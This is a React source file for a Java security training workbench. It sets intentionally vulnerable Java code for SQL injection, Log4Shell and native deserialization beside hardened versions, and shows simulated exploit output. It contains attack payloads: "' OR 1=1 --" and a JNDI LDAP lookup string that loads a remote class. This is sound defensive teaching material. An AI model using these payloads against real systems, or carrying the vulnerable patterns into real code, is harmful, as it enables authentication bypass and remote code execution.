/**
 * Java Security Lab & Vulnerability Remediation Workbench
 * Demonstrates real Java security flaws, JVM runtime mechanics, and industry-standard defensive code patterns.
 */

import React, { useState } from 'react';
import { Code2, ShieldAlert, ShieldCheck, Play, CheckCircle2, AlertOctagon, Terminal } from 'lucide-react';
import { soundEngine } from '../services/soundEngine';

interface SecurityTopic {
  id: string;
  title: string;
  cve: string;
  category: string;
  summary: string;
  vulnerableCode: string;
  secureCode: string;
  testPayload: string;
  vulnerableOutput: string;
  secureOutput: string;
  preventionRules: string[];
}

const TOPICS: SecurityTopic[] = [
  {
    id: 'sqli',
    title: 'JDBC SQL Injection vs PreparedStatements',
    cve: 'CWE-89 / OWASP A03',
    category: 'Injection',
    summary: 'Concatenating untrusted user strings directly into SQL queries allows attackers to change the query structure, bypass authentication, and exfiltrate database contents.',
    vulnerableCode: `// ❌ VULNERABLE: String concatenation into SQL statement
public boolean login(String username, String password) throws SQLException {
    String sql = "SELECT * FROM users WHERE user = '" + username + 
                 "' AND pass = '" + password + "'";
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(sql);
    return rs.next(); // Returns true if any row matched!
}`,
    secureCode: `// ✅ SECURE: Parameterized query with PreparedStatement
public boolean login(String username, String password) throws SQLException {
    String sql = "SELECT id, password_hash, salt FROM users WHERE user = ?";
    try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
        pstmt.setString(1, username); // Bound as literal data, never executed as SQL!
        try (ResultSet rs = pstmt.executeQuery()) {
            if (rs.next()) {
                return verifyArgon2(password, rs.getString("password_hash"));
            }
            return false;
        }
    }
}`,
    testPayload: "' OR 1=1 --",
    vulnerableOutput: `[EXPLOIT SUCCEEDED]: Query compiled as:
SELECT * FROM users WHERE user = '' OR 1=1 --' AND pass = '...'
WHERE clause evaluated to TRUE for all rows! Authenticated as SUPER_ADMIN.`,
    secureOutput: `[BLOCKED BY PREPAREDSTATEMENT]: Query compiled as:
SELECT id, password_hash FROM users WHERE user = ?
Parameter 1 treated as literal string: "' OR 1=1 --"
No user found matching that literal string name. Access Denied.`,
    preventionRules: [
      'Always use PreparedStatement with bind variables (?) instead of Statement.',
      'Use modern ORMs (Spring Data JPA, Hibernate) with named parameters (:username).',
      'Never construct dynamic SQL using string formatting or template literals.'
    ]
  },
  {
    id: 'log4shell',
    title: 'Log4Shell (CVE-2021-44228) & Safe Java Logging',
    cve: 'CVE-2021-44228 / CVSS 10.0',
    category: 'RCE / JNDI Injection',
    summary: 'Apache Log4j <= 2.14.1 evaluated JNDI lookups inside logged strings. Attackers placed \${jndi:ldap://...} in HTTP headers to make the JVM download and execute remote class bytecode.',
    vulnerableCode: `// ❌ VULNERABLE: Direct string interpolation into log statement
@GetMapping("/api/audit")
public ResponseEntity<String> audit(@RequestHeader("X-Api-Version") String version) {
    // If version contains \${jndi:ldap:...}, Log4j resolves and executes it!
    logger.info("Received request from client API version: " + version);
    return ResponseEntity.ok("Logged");
}`,
    secureCode: `// ✅ SECURE: Parameterized logging & disabled lookups
@GetMapping("/api/audit")
public ResponseEntity<String> audit(@RequestHeader("X-Api-Version") String version) {
    // 1. Sanitize input to strip recursive expression delimiters
    String safeVersion = version.replaceAll("[\\$\\{\\}]", "");
    // 2. Pass as parameter argument instead of string concatenation
    logger.info("Received request from client API version: {}", safeVersion);
    return ResponseEntity.ok("Logged");
}
// 3. JVM Flag: -Dlog4j2.formatMsgNoLookups=true (or upgrade Log4j >= 2.17.1)`,
    testPayload: "${jndi:ldap://127.0.0.1:1389/Exploit}",
    vulnerableOutput: `[EXPLOIT SUCCEEDED]: Log4j parsed \${jndi:ldap:...} directive.
JNDI client contacted remote LDAP directory at 127.0.0.1:1389.
Remote Exploit.class downloaded and instantiated by AppClassLoader.
Remote Code Execution established.`,
    secureOutput: `[SECURE LOGGING]: Log4j logged parameter as verbatim text:
2026-10-25 10:20:14.901 [main] INFO AuditService - Received request from client API version: jndi:ldap://127.0.0.1:1389/Exploit
No JNDI lookup dispatched. Zero execution risk.`,
    preventionRules: [
      'Upgrade Log4j to version 2.17.1 or higher where JNDI lookups are disabled by default.',
      'Pass -Dlog4j2.formatMsgNoLookups=true to JVM arguments.',
      'Use SLF4J parameterized logging format: logger.info("User: {}", username).'
    ]
  },
  {
    id: 'deserialization',
    title: 'Insecure Java Deserialization (ObjectInputStream)',
    cve: 'CWE-502 / OWASP A08',
    category: 'Deserialization',
    summary: 'Calling readObject() on arbitrary ObjectInputStream allows attackers to craft serialization gadget chains (using classes in the classpath) to execute commands upon deserialization.',
    vulnerableCode: `// ❌ VULNERABLE: Unrestricted Java native deserialization
public Object processPayload(byte[] untrustedBytes) throws Exception {
    ByteArrayInputStream bais = new ByteArrayInputStream(untrustedBytes);
    ObjectInputStream ois = new ObjectInputStream(bais);
    // Automatically executes readObject() hooks on attacker-controlled classes!
    return ois.readObject(); 
}`,
    secureCode: `// ✅ SECURE: Whitelist ObjectInputFilter or use typed JSON
public UserDTO processPayloadSafe(String jsonPayload) throws Exception {
    // Prefer safe data formats like JSON over Java native serialization
    ObjectMapper mapper = new ObjectMapper();
    return mapper.readValue(jsonPayload, UserDTO.class);
}

// Or with Java 9+ ObjectInputFilter:
ois.setObjectInputFilter(filterInfo -> {
    Class<?> clazz = filterInfo.serialClass();
    if (clazz != null && clazz.equals(UserDTO.class)) {
        return ObjectInputFilter.Status.ALLOWED;
    }
    return ObjectInputFilter.Status.REJECTED;
});`,
    testPayload: "[Byte stream with InvokerTransformer gadget chain]",
    vulnerableOutput: `[EXPLOIT SUCCEEDED]: ObjectInputStream reconstructed serializable object.
InvokerTransformer.transform() invoked Runtime.getRuntime().exec("whoami").
Privilege compromised.`,
    secureOutput: `[BLOCKED BY FILTER]: ObjectInputFilter rejected unauthorized class:
org.apache.commons.collections.functors.InvokerTransformer
java.io.InvalidClassException: Deserialization filter status: REJECTED`,
    preventionRules: [
      'Do not use Java native serialization (ObjectInputStream) for untrusted network input.',
      'Prefer standard JSON or Protocol Buffers serialization.',
      'If native serialization is required, strictly enforce java.io.ObjectInputFilter whitelists.'
    ]
  }
];

export const JavaSecurityWorkbench: React.FC = () => {
  const [activeTopicId, setActiveTopicId] = useState<string>('sqli');
  const [simulationState, setSimulationState] = useState<'idle' | 'vulnerable' | 'secure'>('idle');

  const topic = TOPICS.find((t) => t.id === activeTopicId) || TOPICS[0];

  const handleTestVulnerable = () => {
    soundEngine.playExploitSuccess();
    setSimulationState('vulnerable');
  };

  const handleTestSecure = () => {
    soundEngine.playPatchSuccess();
    setSimulationState('secure');
  };

  return (
    <div className="flex-1 flex flex-col md:flex-row overflow-hidden bg-neutral-950 font-mono text-xs">
      {/* Topics Sidebar */}
      <div className="w-full md:w-72 border-b md:border-b-0 md:border-r border-neutral-800 p-3 space-y-2 shrink-0 overflow-y-auto">
        <div className="text-[11px] font-bold text-neutral-400 uppercase tracking-wider px-2 py-1">
          Java Vulnerability Modules
        </div>

        {TOPICS.map((item) => (
          <button
            key={item.id}
            onClick={() => {
              setActiveTopicId(item.id);
              setSimulationState('idle');
            }}
            className={`w-full text-left p-3 rounded-lg border transition-all ${
              item.id === activeTopicId
                ? 'bg-neutral-900 border-purple-500 text-white shadow-sm'
                : 'bg-neutral-950 border-neutral-800 text-neutral-400 hover:border-neutral-700 hover:text-neutral-200'
            }`}
          >
            <div className="font-bold text-xs mb-1 text-white">{item.title}</div>
            <div className="text-[10px] text-purple-400 font-semibold">{item.cve}</div>
          </button>
        ))}
      </div>

      {/* Main Analysis Pane */}
      <div className="flex-1 overflow-y-auto p-4 sm:p-6 space-y-6">
        {/* Module Header */}
        <div className="pb-4 border-b border-neutral-800">
          <div className="flex items-center gap-2 mb-1">
            <h2 className="text-lg font-bold text-white">{topic.title}</h2>
            <span className="px-2 py-0.5 rounded bg-purple-950 text-purple-400 border border-purple-800 text-[10px] font-bold">
              {topic.cve}
            </span>
          </div>
          <p className="text-neutral-300 text-xs sm:text-sm leading-relaxed mt-2">
            {topic.summary}
          </p>
        </div>

        {/* Side-by-Side Code Review */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          {/* Vulnerable */}
          <div className="flex flex-col bg-red-950/20 border border-red-900/40 rounded-xl overflow-hidden">
            <div className="px-4 py-2 bg-red-950/40 border-b border-red-900/40 font-bold text-red-400 flex items-center justify-between">
              <span>Vulnerable Implementation</span>
              <span className="text-[10px] text-neutral-400 font-normal">Antipattern</span>
            </div>
            <pre className="p-4 text-neutral-200 font-mono text-xs overflow-x-auto leading-relaxed flex-1">
              {topic.vulnerableCode}
            </pre>
          </div>

          {/* Secure */}
          <div className="flex flex-col bg-emerald-950/20 border border-emerald-900/40 rounded-xl overflow-hidden">
            <div className="px-4 py-2 bg-emerald-950/40 border-b border-emerald-900/40 font-bold text-emerald-400 flex items-center justify-between">
              <span>Secure Implementation</span>
              <span className="text-[10px] text-neutral-400 font-normal">Hardened</span>
            </div>
            <pre className="p-4 text-neutral-200 font-mono text-xs overflow-x-auto leading-relaxed flex-1">
              {topic.secureCode}
            </pre>
          </div>
        </div>

        {/* Interactive Exploit vs Defense Simulator */}
        <div className="bg-neutral-900/80 border border-neutral-800 rounded-xl p-4 space-y-3">
          <div className="flex items-center justify-between">
            <div className="font-bold text-white text-xs flex items-center gap-2">
              <Terminal className="w-4 h-4 text-sky-400" />
              <span>Simulated Payload Execution Tester</span>
            </div>
            <div className="text-[11px] text-neutral-400">
              Payload: <code className="text-amber-400 bg-neutral-950 px-1.5 py-0.5 rounded">{topic.testPayload}</code>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={handleTestVulnerable}
              className="px-4 py-2 bg-red-600/80 hover:bg-red-600 active:scale-95 text-white rounded font-bold transition-all flex items-center gap-1.5 text-xs"
            >
              <AlertOctagon className="w-4 h-4" />
              <span>Run Against Vulnerable Code</span>
            </button>

            <button
              onClick={handleTestSecure}
              className="px-4 py-2 bg-emerald-600/80 hover:bg-emerald-600 active:scale-95 text-white rounded font-bold transition-all flex items-center gap-1.5 text-xs"
            >
              <CheckCircle2 className="w-4 h-4" />
              <span>Run Against Hardened Code</span>
            </button>
          </div>

          {/* Simulation Output Window */}
          {simulationState !== 'idle' && (
            <div
              className={`p-3 rounded-lg border font-mono text-xs whitespace-pre-wrap leading-relaxed ${
                simulationState === 'vulnerable'
                  ? 'bg-red-950/40 border-red-800/80 text-red-200'
                  : 'bg-emerald-950/40 border-emerald-800/80 text-emerald-200'
              }`}
            >
              {simulationState === 'vulnerable' ? topic.vulnerableOutput : topic.secureOutput}
            </div>
          )}
        </div>

        {/* Key Prevention Rules */}
        <div className="bg-neutral-900/60 border border-neutral-800 rounded-xl p-4">
          <h4 className="font-bold text-white text-xs mb-2">Industry Standard Prevention Checklist:</h4>
          <ul className="space-y-1.5 text-neutral-300 text-xs list-disc list-inside">
            {topic.preventionRules.map((rule, idx) => (
              <li key={idx} className="leading-relaxed">
                {rule}
              </li>
            ))}
          </ul>
        </div>
      </div>
    </div>
  );
};
